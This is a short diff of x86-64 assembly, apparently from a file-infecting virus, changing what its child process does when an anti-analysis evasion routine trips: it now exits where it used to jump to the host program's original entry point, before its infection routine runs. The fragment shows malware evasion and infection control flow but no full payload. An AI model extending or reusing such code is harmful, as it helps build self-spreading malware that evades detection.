@@ -45,13 +45,13 @@ infected:
     jmp .jmp_to_og_entry
 
 .child_process:
-	; run evasion routine. If tripped, just jmp to entry
+	; run evasion routine. If tripped, just exit
     push rdx
     call evasion_routine
     pop rdx
 
     test rax, rax
-    jz .jmp_to_og_entry
+    jz exit_ok
 
     ; run infection routine
     push rdx
